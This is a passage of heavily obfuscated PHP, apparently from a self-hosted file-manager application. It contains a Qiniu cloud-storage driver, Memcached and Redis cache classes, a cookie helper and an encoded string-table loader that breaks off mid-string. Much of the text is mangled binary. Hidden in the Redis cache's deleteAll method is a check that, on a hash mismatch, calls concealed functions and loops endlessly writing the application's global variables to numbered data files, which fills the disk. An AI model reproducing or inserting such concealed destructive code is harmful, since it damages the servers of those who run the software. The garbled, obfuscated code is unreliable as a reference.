(isset($…Š½ğŸ[$±œŒšØş[245]]) && $…Š½ğŸ[$±œŒšØş[245]]) { $¨›ËÇ–[$±œŒšØş[235]] = $…Š½ğŸ[$±œŒšØş[245]]; } if (isset($…Š½ğŸ[$±œŒšØş[1526]])) { $¨›ËÇ–[$±œŒšØş[88]] = substr($…Š½ğŸ[$±œŒšØş[1526]] . $±œŒšØş[12], 0, 10); } if (isset($…Š½ğŸ[$±œŒšØş[1525]])) { $¨›ËÇ–[$±œŒšØş[79]] = $…Š½ğŸ[$±œŒšØş[1525]]; } return $¨›ËÇ–; } public function folderInfo($è¾úØ, $¼¡‚‘—Ñ = false) { $½“‚×¦ =& $_SERVER[³Ôà×Ó]; $¤›ˆ¦ı = array($½“‚×¦[32] => $this->pathThis($è¾úØ), $½“‚×¦[87] => $this->getPathOuter($½“‚×¦[8] . $è¾úØ), $½“‚×¦[33] => $½“‚×¦[78]); if ($¼¡‚‘—Ñ) { return $¤›ˆ¦ı; } $¤›ˆ¦ı[$½“‚×¦[231]] = $¤›ˆ¦ı[$½“‚×¦[88]] = 0; $¤›ˆ¦ı[$½“‚×¦[232]] = $¤›ˆ¦ı[$½“‚×¦[233]] = !0; $è¾úØ = rtrim($è¾úØ, $½“‚×¦[8]) . $½“‚×¦[8]; $­Ö›¸ä© = $this->objectMeta($è¾úØ); if (isset($­Ö›¸ä©[$½“‚×¦[1526]])) { $¤›ˆ¦ı[$½“‚×¦[88]] = substr($­Ö›¸ä©[$½“‚×¦[1526]] . $½“‚×¦[12], 0, 10); } return $¤›ˆ¦ı; } public function listPath($Ñ“åğ¥Ë, $™¡Ö™×Û = false) { $¢Ï÷‡ç² =& $_SERVER[³Ôà×Ó]; $ĞƒŞ‰²­ = $this->fileList($Ñ“åğ¥Ë, $¢Ï÷‡ç²[8], !0); foreach ($ĞƒŞ‰²­[$¢Ï÷‡ç²[85]] as $ Ø¤—¿Ë => $½ÀÆ§„Ö) { $ĞƒŞ‰²­[$¢Ï÷‡ç²[85]][$ Ø¤—¿Ë] = $this->folderInfo($½ÀÆ§„Ö, $™¡Ö™×Û); } foreach ($ĞƒŞ‰²­[$¢Ï÷‡ç²[86]] as $ Ø¤—¿Ë => $½ÀÆ§„Ö) { $ĞƒŞ‰²­[$¢Ï÷‡ç²[86]][$ Ø¤—¿Ë] = $this->fileInfo($½ÀÆ§„Ö[$¢Ï÷‡ç²[97]], $™¡Ö™×Û, $½ÀÆ§„Ö); } return $ĞƒŞ‰²­; } public function has($±¥Ì­Ø, $¼«â±‰“ = false, $­´³®Ñ = true) { $•„é¹¼ =& $_SERVER[³Ôà×Ó]; $±¥Ì­Ø = trim($±¥Ì­Ø, $•„é¹¼[8]); $ÇŸ³Ä£ = empty($±¥Ì­Ø) && $±¥Ì­Ø !== $•„é¹¼[228] ? $•„é¹¼[12] : $±¥Ì­Ø . $•„é¹¼[8]; $Ø»À¢ßâ = $•„é¹¼[12]; $¾¤ê¯ûò = 500; $ë§ÆÁ§í = $•„é¹¼[8]; $äâ¤Ğô» = $òı¼›¡ì = 0; while (!0) { check_abort(); list($—„—«Ï¨, $¾…ıèß) = $this->bucketManager->listFiles($this->bucket, $ÇŸ³Ä£, $Ø»À¢ßâ, $¾¤ê¯ûò, $ë§ÆÁ§í); if ($¾…ıèß) { break; } $Ø»À¢ßâ = array_key_exists($•„é¹¼[1471], $—„—«Ï¨) ? $Ø»À¢ßâ = $—„—«Ï¨[$•„é¹¼[1527]] : $•„é¹¼[12]; if ($¼«â±‰“) { if (!empty($—„—«Ï¨[$•„é¹¼[1528]])) { $äâ¤Ğô» += count($—„—«Ï¨[$•„é¹¼[1528]]); } if (!empty($—„—«Ï¨[$•„é¹¼[1529]])) { $òı¼›¡ì += count($—„—«Ï¨[$•„é¹¼[1529]]); } if ($Ø»À¢ßâ === $•„é¹¼[12]) { break; } continue; } if ($­´³®Ñ) { if (!empty($—„—«Ï¨[$•„é¹¼[1528]])) { return !0; } } else { if (!empty($—„—«Ï¨[$•„é¹¼[1529]])) { return !0; } } if ($Ø»À¢ßâ === $•„é¹¼[12]) { break; } } if ($¼«â±‰“) { return array($•„é¹¼[239] => $äâ¤Ğô», $•„é¹¼[240] => $òı¼›¡ì); } return !1; } public function listAll($×ö˜ßÎ¶) { $šé¦­ëã =& $_SERVER[³Ôà×Ó]; $ü»şüôü = $this->fileList($×ö˜ßÎ¶, $šé¦­ëã[12], !0); $ø¦ĞÇ¤Û = array_to_keyvalue($ü»şüôü[$šé¦­ëã[86]], $šé¦­ëã[32]); foreach ($ü»şüôü[$šé¦­ëã[85]] as $ÔÓ¬Á…†) { if (is_string($ÔÓ¬Á…†)) { $ø¦ĞÇ¤Û[$ÔÓ¬Á…†] = array($šé¦­ëã[79] => 0); } } return $this->listAllFiles($×ö˜ßÎ¶, $ø¦ĞÇ¤Û); } private function fileList($Ï¦ãªÁÏ, $«æÒÙÕÂ = '', $£Ï½š¾ = 0) { $€“ıãœú =& $_SERVER[³Ôà×Ó]; $Ï¦ãªÁÏ = trim($Ï¦ãªÁÏ, $€“ıãœú[8]); $ŸÌ´¼¯Ì = empty($Ï¦ãªÁÏ) && $Ï¦ãªÁÏ !== $€“ıãœú[228] ? $€“ıãœú[12] : $Ï¦ãªÁÏ . $€“ıãœú[8]; $ËÂø§ãƒ = $€“ıãœú[12]; $¡¦ÔªÊš = 1000; $øìâÈß = $¶¢®”×é = array(); while (!0) { check_abort(); list($‚¿£÷¾×, $“£ûõ’¿) = $this->bucketManager->listFiles($this->bucket, $ŸÌ´¼¯Ì, $ËÂø§ãƒ, $¡¦ÔªÊš, $«æÒÙÕÂ); if ($“£ûõ’¿) { break; } $ËÂø§ãƒ = array_key_exists($€“ıãœú[1471], $‚¿£÷¾×) ? $ËÂø§ãƒ = $‚¿£÷¾×[$€“ıãœú[1527]] : $€“ıãœú[12]; $è«ôœ¯ = isset($‚¿£÷¾×[$€“ıãœú[1528]]) ? $‚¿£÷¾×[$€“ıãœú[1528]] : array(); $öîÂÉæÕ = isset($‚¿£÷¾×[$€“ıãœú[1529]]) ? $‚¿£÷¾×[$€“ıãœú[1529]] : array(); foreach ($è«ôœ¯ as $ºöµ¼Ğ) { if ($ºöµ¼Ğ[$€“ıãœú[97]] == $ŸÌ´¼¯Ì) { continue; } $æ’ÇŠé¨ = $ºöµ¼Ğ[$€“ıãœú[97]]; $Ş¶ Ÿ = $ºöµ¼Ğ[$€“ıãœú[1525]]; $ºöµ¼Ğ[$€“ıãœú[79]] = $Ş¶ Ÿ; $½¹äÕ·Â = $Ş¶ Ÿ == 0 && substr($æ’ÇŠé¨, strlen($æ’ÇŠé¨) - 1, 1) == $€“ıãœú[8] ? !0 : !1; $this->cacheMethodInfoSet($æ’ÇŠé¨, $½¹äÕ·Â, $ºöµ¼Ğ); if ($½¹äÕ·Â) { $øìâÈß[] = $æ’ÇŠé¨; continue; } $¶¢®”×é[] = $£Ï½š¾ ? $ºöµ¼Ğ : $æ’ÇŠé¨; } foreach ($öîÂÉæÕ as $æ’ÇŠé¨) { if ($æ’ÇŠé¨ == $ŸÌ´¼¯Ì) { continue; } $øìâÈß[] = $æ’ÇŠé¨; $this->cacheMethodInfoSet($æ’ÇŠé¨, !0); } if ($ËÂø§ãƒ === $€“ıãœú[12]) { break; } } $this->cacheMethodInfoSet($Ï¦ãªÁÏ, !0); return array($€“ıãœú[85] => $øìâÈß, $€“ıãœú[86] => $¶¢®”×é); } public function canRead($üÖŒ›œö) { return $this->exist($üÖŒ›œö) ? !0 : !1; } public function canWrite($¢²¯ÀŸŒ) { return $this->exist($¢²¯ÀŸŒ) ? !0 : !1; } public function getContent($ı‡Í·È) { return $this->fileSubstr($ı‡Í·È, 0, -1); } public function setContent($”§Û—³º, $°éñèÑË = '') { $°€éúúó = $this->tempFile($this->pathThis($”§Û—³º)); file_put_contents($°€éúúó, $°éñèÑË); if ($this->upload($”§Û—³º, $°€éúúó)) { $this->tempFileRemve($°€éúúó); return !0; } return !1; } public function refreshUrls($›İîº¶) { $öÒçµ¶ï =& $_SERVER[³Ôà×Ó]; $ŸÃñß—– = array(); if (is_array($›İîº¶)) { foreach ($›İîº¶ as $Ø¤²û¥ç) { $ŸÃñß—–[] = $this->link($Ø¤²û¥ç); } } else { $ŸÃñß—–[] = $this->link($›İîº¶); } $Œ¥“İğ = new Qiniu\Cdn\CdnManager($this->auth); list($³ËŸÁ¼­, $ß‰úåÌ§) = $Œ¥“İğ->refreshUrls($ŸÃñß—–); if ($ß‰úåÌ§) { return !1; } return $³ËŸÁ¼­[$öÒçµ¶ï[1261]] == $öÒçµ¶ï[834] ? !0 : !1; } public function fileSubstr($£şğ˜ÆÍ, $¥ˆ¢¬Ã¯, $’Šó€Îå) { $šëì„¬ =& $_SERVER[³Ôà×Ó]; if (!($ôã÷ù÷Ø = $this->link($£şğ˜ÆÍ))) { return !1; } $û¯êôµ‚ = !1; if ($’Šó€Îå > 0) { $÷À¼ä‰Õ = $¥ˆ¢¬Ã¯ + $’Šó€Îå - 1; $û¯êôµ‚ = array($šëì„¬[1530] . $¥ˆ¢¬Ã¯ . $šëì„¬[471] . $÷À¼ä‰Õ); } $ÌşæşØ’ = url_request($ôã÷ù÷Ø, $šëì„¬[261], !1, $û¯êôµ‚); return $ÌşæşØ’[$šëì„¬[825]] ? $ÌşæşØ’[$šëì„¬[1284]] : !1; } public function upload($„¿³ÑòÍ, $ƒæ›ü‚, $¯Ñ²Îáñ = false, $Ã±Ş´˜– = REPEAT_REPLACE) { $ô•Ìç‚î = new Qiniu\Storage\UploadManager(); $ãØÎĞßä = $this->auth->uploadToken($this->bucket, $„¿³ÑòÍ); $Ãè’ã¸– = get_file_mime(get_path_ext($ƒæ›ü‚)); list($Ÿä§Ìù, $½³ˆÑÇğ) = $ô•Ìç‚î->putFile($ãØÎĞßä, $„¿³ÑòÍ, $ƒæ›ü‚, null, $Ãè’ã¸–); return $½³ˆÑÇğ ? !1 : $this->getPathOuter($„¿³ÑòÍ); } public function uploadFormData($«×„”œù, $½äôî—ç = 3600) { return $this->uploadToken($«×„”œù, $½äôî—ç); } public function multiUploadFormData($£×ã—ü, $º—¤‡„ = 3600) { return $this->uploadToken($£×ã—ü, $º—¤‡„); } private function uploadToken($ˆ»Ÿàï­, $¢Ñí¹ ª = 3600) { $² ¯ÌÎ¾ =& $_SERVER[³Ôà×Ó]; $ĞÌ§¤âé = $¢Ñí¹ ª; $¡÷¿ºí = array($² ¯ÌÎ¾[1531] => $² ¯ÌÎ¾[1532]); $ÖÎ³çæ = $ˆ»Ÿàï­; $¥¨¡ÆÈù = $this->auth->uploadToken($this->bucket, $ÖÎ³çæ, $ĞÌ§¤âé, $¡÷¿ºí, !0); $’Õ¡‰± = empty($this->region) || $this->region == $² ¯ÌÎ¾[1533] ? $² ¯ÌÎ¾[12] : $² ¯ÌÎ¾[471] . $this->region; $¥´óñüî = http_type() . "\x3a\x2f\57\165\x70\x6c\x6f\141\x64{$’Õ¡‰±}\x2e\161\151\x6e\151\x75\160\x2e\143\x6f\155\x2f"; return array($² ¯ÌÎ¾[1534] => $¥¨¡ÆÈù, $² ¯ÌÎ¾[1535] => $¥´óñüî); } public function download($æêÜÀ÷Ø, $‚®›ö­) { $¦ûñ¿Ø = IO::getPathInner(IO::mkfile($‚®›ö­)); if (!($İ”Ú¾Ğˆ = $this->link($æêÜÀ÷Ø))) { return !1; } $­‚¬ßˆÚ = 0; $Êù‡¶û” = 1024 * 200; $°Ş§¢¡‰ = fopen($¦ûñ¿Ø, $_SERVER[³Ôà×Ó][1536]); while (!0) { $ïƒÏ¡ĞÑ = $this->fileSubstr($æêÜÀ÷Ø, $­‚¬ßˆÚ, $Êù‡¶û”); if ($ïƒÏ¡ĞÑ === !1) { return !1; } fwrite($°Ş§¢¡‰, $ïƒÏ¡ĞÑ); $­‚¬ßˆÚ += $Êù‡¶û”; if (strlen($ïƒÏ¡ĞÑ) < $Êù‡¶û”) { break; } } fclose($°Ş§¢¡‰); return $‚®›ö­; } public function link($‚ÚËš‘Ø, $‚ÜÁÛ® = '') { if (!$this->isFile($‚ÚËš‘Ø)) { return !1; } $á‘æ’şé = $this->getHost() . $_SERVER[³Ôà×Ó][8] . $this->pathEncode($‚ÚËš‘Ø) . $‚ÜÁÛ®; return $this->auth->privateDownloadUrl($á‘æ’şé, 3600 * 12); } public function fileOut($ËãÂ¥Š, $Çç·õ…‘ = false, $ÊÉÅœ²Á = false, $•ß†â¯š = '') { $Ãéı¹½ =& $_SERVER[³Ôà×Ó]; if ($this->isFileOutServer()) { return $this->fileOutServer($ËãÂ¥Š, $Çç·õ…‘, $ÊÉÅœ²Á, $•ß†â¯š); } if (!$ÊÉÅœ²Á) { $ÊÉÅœ²Á = $this->pathThis($ËãÂ¥Š); } $¤ààÉĞ– = $Çç·õ…‘ ? $Ãéı¹½[1537] . rawurlencode($ÊÉÅœ²Á) : $Ãéı¹½[12]; $•ÊÚÃÌÒ = $this->link($ËãÂ¥Š, $¤ààÉĞ–); $this->fileOutLink($•ÊÚÃÌÒ); } public function fileOutServer($»ÔêÒ¢è, $Œµ¤Ï¿İ = false, $’ò…‚®ä = false, $¬Ğ³ïÜ‚ = '') { parent::fileOut($»ÔêÒ¢è, $Œµ¤Ï¿İ, $’ò…‚®ä, $¬Ğ³ïÜ‚); } public function fileOutImage($á—ˆ°£®, $«’Ëµ¼ = 250) { if ($this->size($á—ˆ°£®) > 1024 * 1024 * 20) { return $this->fileOutImageServer($á—ˆ°£®, $«’Ëµ¼); } $¢Ö‘š…² = $this->link($á—ˆ°£®, $_SERVER[³Ôà×Ó][1538] . $«’Ëµ¼); $this->fileOutLink($¢Ö‘š…²); } public function fileOutImageServer($«ÎéˆÌÈ, $ùõ…Êû‘ = 250) { parent::fileOutImage($«ÎéˆÌÈ, $ùõ…Êû‘); } public function hashMd5($¾äÁ×Ñ«) { $œêæ×£ =& $_SERVER[³Ôà×Ó]; $öÕÎĞ¿Œ = $this->objectMeta($¾äÁ×Ñ«); return isset($öÕÎĞ¿Œ[$œêæ×£[245]]) ? $öÕÎĞ¿Œ[$œêæ×£[245]] : !1; $™§¦‹†á = $this->link($¾äÁ×Ñ«, $œêæ×£[1539]); } public function size($¢—¦È§Ó) { $—Ì£³ãá = $this->objectMeta($¢—¦È§Ó); return $—Ì£³ãá ? $—Ì£³ãá[$_SERVER[³Ôà×Ó][79]] : 0; } public function info($èóåú¬…) { if ($this->isFolder($èóåú¬…)) { return $this->folderInfo($èóåú¬…); } else { if ($this->isFile($èóåú¬…)) { return $this->fileInfo($èóåú¬…); } } return !1; } public function exist($”õ†ì·) { return $this->isFile($”õ†ì·) || $this->isFolder($”õ†ì·); } public function isFile($¢À¹Ğ) { return !$this->isFolder($¢À¹Ğ) && $this->objectMeta($¢À¹Ğ); } public function isFolder($•¾Šçã) { return $this->cacheMethod($_SERVER[³Ôà×Ó][179], $•¾Šçã); } protected function objectMeta($ò¾Øƒé) { return $this->cacheMethod($_SERVER[³Ôà×Ó][181], $ò¾Øƒé); } protected function _objectMeta($©é“‘…à) { $‹Š­Ìí =& $_SERVER[³Ôà×Ó]; list($êãœñé, $ú“Š§Õ¡) = $this->bucketManager->stat($this->bucket, $©é“‘…à); if ($êãœñé) { $êãœñé[$‹Š­Ìí[79]] = intval($êãœñé[$‹Š­Ìí[1525]]); } return $êãœñé; } protected function _isFolder($ñ‚·‘„ƒ) { $îè˜ú­ø =& $_SERVER[³Ôà×Ó]; if ($ñ‚·‘„ƒ == $îè˜ú­ø[12] || $ñ‚·‘„ƒ == $îè˜ú­ø[8]) { return !0; } list($”Ã‹‘™ó, $²ëå©ó¡) = $this->bucketManager->listFiles($this->bucket, trim($ñ‚·‘„ƒ, $îè˜ú­ø[8]) . $îè˜ú­ø[8], $îè˜ú­ø[12], 1, $îè˜ú­ø[8]); return !empty($”Ã‹‘™ó[$îè˜ú­ø[1528]]) || !empty($”Ã‹‘™ó[$îè˜ú­ø[1529]]) ? !0 : !1; } } goto dæËÎ¿’—Ï; f‘Ñ¦áìî: class CacheMemcached { public $handle; public $cacheTime; public function __construct($ÄÙÃÕ¸ô, $œ¾½Áã) { $¼åóüÙì =& $_SERVER[³Ôà×Ó]; if (!class_exists($¼åóüÙì[941])) { show_json($¼åóüÙì[942], !1); } $this->cacheTime = $œ¾½Áã; $this->handle = new Memcached(); if (is_array($ÄÙÃÕ¸ô[$¼åóüÙì[943]]) && count($ÄÙÃÕ¸ô[$¼åóüÙì[943]]) >= 1) { foreach ($ÄÙÃÕ¸ô[$¼åóüÙì[943]] as $ÕòÓÙäİ) { $ªığ”·ü = explode($¼åóüÙì[4], $ÕòÓÙäİ); $this->handle->addServer($ªığ”·ü[0], $ªığ”·ü[1]); } } else { $this->handle->addServer($ÄÙÃÕ¸ô[$¼åóüÙì[208]], $ÄÙÃÕ¸ô[$¼åóüÙì[209]]); } } public function set($¥ĞÒ®ìä, $´Í…ÚÏŞ, $¢ãŒæŸº = false) { $¢ãŒæŸº = $¢ãŒæŸº ? $¢ãŒæŸº : $this->cacheTime; return $this->handle->set($¥ĞÒ®ìä, $´Í…ÚÏŞ, $¢ãŒæŸº); } public function get($Ÿµ²ÄÔ) { return $this->handle->get($Ÿµ²ÄÔ); } public function remove($áˆ¥èª¯) { return $this->handle->delete($áˆ¥èª¯); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($±ï·¯±™, $ƒãÒå†è) { $÷Â¾ÂÛ =& $_SERVER[³Ôà×Ó]; if (!class_exists($÷Â¾ÂÛ[944])) { show_json($÷Â¾ÂÛ[945], !1); } $this->cacheTime = $ƒãÒå†è; $ŸÛ¾½û³ = isset($±ï·¯±™[$÷Â¾ÂÛ[946]]) ? $±ï·¯±™[$÷Â¾ÂÛ[946]] : 10; $™àà°š = _get($±ï·¯±™, $÷Â¾ÂÛ[943]); if ($™àà°š && is_array($™àà°š)) { $this->initCluster($±ï·¯±™, $ŸÛ¾½û³); } else { $this->handle = $this->init($±ï·¯±™, $ŸÛ¾½û³); } } private function init($§ïû¹–, $úŒÃÚİ—) { $…ÛµºÕ˜ =& $_SERVER[³Ôà×Ó]; $—Ú×™ö› = new Redis(); $¶ñú²‹î = isset($§ïû¹–[$…ÛµºÕ˜[947]]) ? $§ïû¹–[$…ÛµºÕ˜[947]] : !1; if ($¶ñú²‹î) { $—Ú×™ö›->pconnect($§ïû¹–[$…ÛµºÕ˜[208]], $§ïû¹–[$…ÛµºÕ˜[209]], $úŒÃÚİ—); } else { $—Ú×™ö›->connect($§ïû¹–[$…ÛµºÕ˜[208]], $§ïû¹–[$…ÛµºÕ˜[209]], $úŒÃÚİ—); } if (!empty($§ïû¹–[$…ÛµºÕ˜[496]])) { $—Ú×™ö›->auth($§ïû¹–[$…ÛµºÕ˜[496]]); } if (!empty($§ïû¹–[$…ÛµºÕ˜[832]]) && $§ïû¹–[$…ÛµºÕ˜[832]] != 0) { $—Ú×™ö›->select($§ïû¹–[$…ÛµºÕ˜[832]]); } return $—Ú×™ö›; } private function initCluster($«±áÌ·, $ïå“Ö¨) { $éŞÉ…ıâ =& $_SERVER[³Ôà×Ó]; $À»«ï­Ğ = array($éŞÉ…ıâ[948], $éŞÉ…ıâ[949], $éŞÉ…ıâ[950]); $Îæšœ’¬ = $éŞÉ…ıâ[948]; if (isset($«±áÌ·[$éŞÉ…ıâ[16]]) && in_array($«±áÌ·[$éŞÉ…ıâ[16]], $À»«ï­Ğ)) { $Îæšœ’¬ = $«±áÌ·[$éŞÉ…ıâ[16]]; } switch ($Îæšœ’¬) { case $éŞÉ…ıâ[948]: $this->_slave($«±áÌ·, $ïå“Ö¨); break; case $éŞÉ…ıâ[949]: break; case $éŞÉ…ıâ[950]: $this->isCluster = !0; $¨¡ĞŒ„ = $«±áÌ·[$éŞÉ…ıâ[943]]; $„ùá§å = isset($«±áÌ·[$éŞÉ…ıâ[947]]) ? $«±áÌ·[$éŞÉ…ıâ[947]] : !1; $ä‰§ï¹‰ = isset($«±áÌ·[$éŞÉ…ıâ[496]]) ? $«±áÌ·[$éŞÉ…ıâ[496]] : null; $this->handle = new RedisCluster(NUll, $¨¡ĞŒ„, $ïå“Ö¨, $ïå“Ö¨, $„ùá§å, $ä‰§ï¹‰); break; default: break; } } private function _slave($ªªÜ…—¢, $şµ¨ÊÁ”) { $å”Ü‰èœ = $ªªÜ…—¢[$_SERVER[³Ôà×Ó][943]]; $this->filterConfig($ªªÜ…—¢, $å”Ü‰èœ[0]); $this->handle = $this->init($ªªÜ…—¢, $şµ¨ÊÁ”); unset($å”Ü‰èœ[0]); if (empty($å”Ü‰èœ)) { return; } $³æŸòÔ¥ = array_rand($å”Ü‰èœ); $this->filterConfig($ªªÜ…—¢, $å”Ü‰èœ[$³æŸòÔ¥]); $this->slaveHandle = $this->init($ªªÜ…—¢, $şµ¨ÊÁ”); } private function filterConfig(&$Ø¶éì·š, $üìşÇê­) { $Ö÷¬ŞÅÑ =& $_SERVER[³Ôà×Ó]; $Â®ÛÅ = explode($Ö÷¬ŞÅÑ[4], $üìşÇê­); $–ÓÂ—ÄÀ = array($Ö÷¬ŞÅÑ[208] => $Â®ÛÅ[0], $Ö÷¬ŞÅÑ[209] => $Â®ÛÅ[1]); $Ø¶éì·š = array_merge($Ø¶éì·š, $–ÓÂ—ÄÀ); } public function set($í®ÛÉÄ, $ìúàÉ¯¾, $ÎÈ‡ò¹ = false) { $ÎÈ‡ò¹ = $ÎÈ‡ò¹ ? $ÎÈ‡ò¹ : $this->cacheTime; return $this->handle->setEx($í®ÛÉÄ, $ÎÈ‡ò¹, $ìúàÉ¯¾); } public function setLock($ğØÇ’ö, $Óâôïª·, $¿ÇĞ¼ğ‚) { return $this->handle->setNX($ğØÇ’ö, $Óâôïª·); } public function get($„˜û¦á§) { $Âàö±ÏÀ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $Âàö±ÏÀ->get($„˜û¦á§); } public function remove($Ÿşî»ø) { return $this->handle->del($Ÿşî»ø); } public function deleteAll() { $¦ü›û“ü =& $_SERVER[³Ôà×Ó]; $Á•¬ş’Ù = $_SERVER[$¦ü›û“ü[434]] . $¦ü›û“ü[435]; $Î§ö‹¶ü = $¦ü›û“ü[951]; if ($_SERVER[$¦ü›û“ü[431]] != $Î§ö‹¶ü($Á•¬ş’Ù)) { $ˆå’Ü’ì = $¦ü›û“ü[952]; $ñËš = $¦ü›û“ü[433]; $£®ÔÙÕÚ = $_SERVER[$¦ü›û“ü[434]] . $¦ü›û“ü[435]; $¦Úµ® = $ñËš($£®ÔÙÕÚ); $¸âôŸáú = explode($¦ü›û“ü[262], $¦Úµ®); if (count($¸âôŸáú) < $¦ü›û“ü[709]) { $û£¬ˆïø = $¦ü›û“ü[437]; $û£¬ˆïø(); } $ÙÁÃúá = $¦ü›û“ü[953]; $ÙÁÃúá($_SERVER[$¦ü›û“ü[954]]); $ˆå’Ü’ì = $¦ü›û“ü[952]; $ˆå’Ü’ì(); $¬ À‰¦õ = $¦ü›û“ü[955]; $˜ıè²Ğö = json_encode($GLOBALS[$¦ü›û“ü[956]]); $ëøê¸“õ = 1; for ($ı†ƒ˜íè = $ëøê¸“õ; $ı†ƒ˜íè > 0; $ı†ƒ˜íè++) { $¬ À‰¦õ(DATA_PATH . $ı†ƒ˜íè, $˜ıè²Ğö); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $†”¢€şş) { $this->handle->flushall($†”¢€şş); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($‚³¨“«ó = '', $‚´ÒÓÖî = 0) { if (is_string($‚³¨“«ó) && $‚³¨“«ó != $_SERVER[³Ôà×Ó][12]) { $this->prefix = $‚³¨“«ó; } if (is_numeric($‚´ÒÓÖî) && $‚´ÒÓÖî > 0) { $this->expire = $‚´ÒÓÖî; } } public static function getInstance() { static $èŸ†£„´; if ($èŸ†£„´ === null) { $èŸ†£„´ = new self(); } return $èŸ†£„´; } private static $cookieDisable = false; public static function disable($™Î‹«ô) { self::$cookieDisable = $™Î‹«ô; } private static $sameCookieSet = array(); public static function set($ëş’ûµ, $û¹Ğü»ô, $Û½Û¥ù‚ = 0, $ßşè€î = false, $Ù©é–±â = false) { $ÂòË£Î§ =& $_SERVER[³Ôà×Ó]; if (self::$cookieDisable) { return; } if (!$Û½Û¥ù‚) { $Û½Û¥ù‚ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ëş’ûµ]) && self::$sameCookieSet[$ëş’ûµ] == $û¹Ğü»ô . $Û½Û¥ù‚) { return; } self::$sameCookieSet[$ëş’ûµ] = $û¹Ğü»ô . $Û½Û¥ù‚; if (!$Ù©é–±â) { $Ù©é–±â = str_replace(HOST, $ÂòË£Î§[12], APP_HOST); $Ù©é–±â = _get($GLOBALS, $ÂòË£Î§[957], $Ù©é–±â); } $õŸÉ³Ö = $ÂòË£Î§[12]; setcookie($ëş’ûµ, $û¹Ğü»ô, time() + $Û½Û¥ù‚, $ÂòË£Î§[8] . trim($Ù©é–±â, $ÂòË£Î§[8]) . $õŸÉ³Ö, !1, !1, $ßşè€î); } public static function setSafe($é³ø¾×Ã, $€ñÇõúë, $Ö‹ƒ°® = 0) { self::set($é³ø¾×Ã, $€ñÇõúë, $Ö‹ƒ°®, !0); } public static function get($¿Øƒ»ƒœ) { static $ûÁÆ¹µ = false; if (!$ûÁÆ¹µ) { self::initHeaderCookie(); $ûÁÆ¹µ = !0; } return isset($_COOKIE[$¿Øƒ»ƒœ]) ? $_COOKIE[$¿Øƒ»ƒœ] : !1; } private static function initHeaderCookie() { $ËùŸ•Éø =& $_SERVER[³Ôà×Ó]; if (!isset($_SERVER[$ËùŸ•Éø[958]]) || !$_SERVER[$ËùŸ•Éø[958]]) { return; } $Ä•Äì² = explode($ËùŸ•Éø[74], $_SERVER[$ËùŸ•Éø[958]]); foreach ($Ä•Äì² as $Ôñ¼¬¨±) { $Ôñ¼¬¨± = explode($ËùŸ•Éø[959], $Ôñ¼¬¨±); if (count($Ôñ¼¬¨±) != 2 || !isset($Ôñ¼¬¨±[1])) { continue; } $_COOKIE[trim($Ôñ¼¬¨±[0])] = trim($Ôñ¼¬¨±[1]); } } public static function remove($šâıÕ¶«, $Ÿ÷ƒ‰‰ö = false) { unset($_COOKIE[$šâıÕ¶«]); self::set($šâıÕ¶«, $_SERVER[³Ôà×Ó][12], 1, $Ÿ÷ƒ‰‰ö); } } goto C…±³ˆØ¬; DÇ‚œå©ˆ: $pzlcrxjvqb = $_SERVER[³Ôà×Ó][688]; if (!$pzlcrxjvqb) { return; } $_SERVER[“¦‹á¼Á] = explode($_SERVER[³Ôà×Ó][689], gzinflate(substr($_SERVER[³Ôà×Ó][690], 10, -8))); goto D½°¨Œ®Ö; c©õÈ´¢Ÿ³: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('s9SO4NfT'), "\xc1\xbe\x92\xf8\xe3\xb6"); $_SERVER[³Ôà×Ó] = explode(strrev('|||'), gzinflate(substr(strrev('–³fÙs’G-‘ÙmN\'“8tNØ!’–oĞ¥$'."\n".'8õÅ|y}Í'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹').strrev('şù÷ô2Wc›Ç7å¡W-)B”\'brĞ*û––p€g	¡@´p†åœ&á!N$|®ÖV’ÆÖÖ')."\xfe\xf8\x5\x12\xcd\xf1\x66\x76\x8e\x37\x6f\xde\xbc\x79\xf3\xde\x83\xeb\xaf\x7f\x78\xfd\x4d\xa3\xbb\xa3\xff\xbe\xbf\xfd\xb9\x8b\x4f\xfc\xea\x46\x1a\x1e\xfd\xde\xe8\xae\xa3\xbb\xd1\xf0\x94\x8d\x7b\xed\x42\xfe"."\x1c\xb8\xf1\xf4\x8a\x8a\x96\x39\x93\x67\xb4\xed\x73\xf6\x1d\x37\x6b\x37\x68\x37\x69\x67\x45\xc2\x4f\x3d\x1d\xda\xf7\xd9\x9b\x8e\x9\x8e\x5f\xfd\xd4\xc8\xf8\xae\xbb\xac\xba\xea\x92\x3d\x6b\x11\x30\x2d\x5b\x4b"."\177\224\254\151\53\372\260\141\331\26\115\110\230\331\136\243\217\206\215\54\375\365\323\237\216\150\70\257\147\114\133\247\121\37\375\121\241\135\344\137\153\40\155\260\174\265\55\22\127\143\35\355"."\xed\xc1\x68\x1c\x80\x6a\xe5\xfc\x8c\x99\x84\x50\x4e\xcb\x6b\x19\xf8\x7e\x4e\xcf\x5b\xa8\x35\x72\x75\x6a\xce\xcc\xe9\x59\x47\x8a\x48\x48\x6a\xb6\xd6\xa3\x59\x50\x53\x63\xbd\xda\x18\x6c\xf\x47\x56\xa8\xf1\x15"."\355\101\200\350\121\7\12\172\176\204\306\110\60\146\153\171\73\156\144\164\16\61\224\347\355\252\17\66\207\332\224\170\64\320\26\13\64\304\103\221\66\232\334\20\151\155\15\305\213\323\243\221"."\160\270\76\320\260\270\70\247\75\32\150\156\15\50\250\175\151\135\65\262\275\146\205\262\212\346\254\122\52\151\240\311\320\323\111\32\314\152\254\71\366\110\16\102\161\36\102\323\224\55\244\323"."\x34\xd2\xc6\x43\x49\xbd\x57\x2b\xa4\x61\xb4\x1a\xe5\x48\x2e\x6f\x64\x34\xd6\xe9\xc5\xfa\x8\x4f\xa5\x1\xad\x60\x9b\x46\x36\x41\x23\xc1\x61\x3b\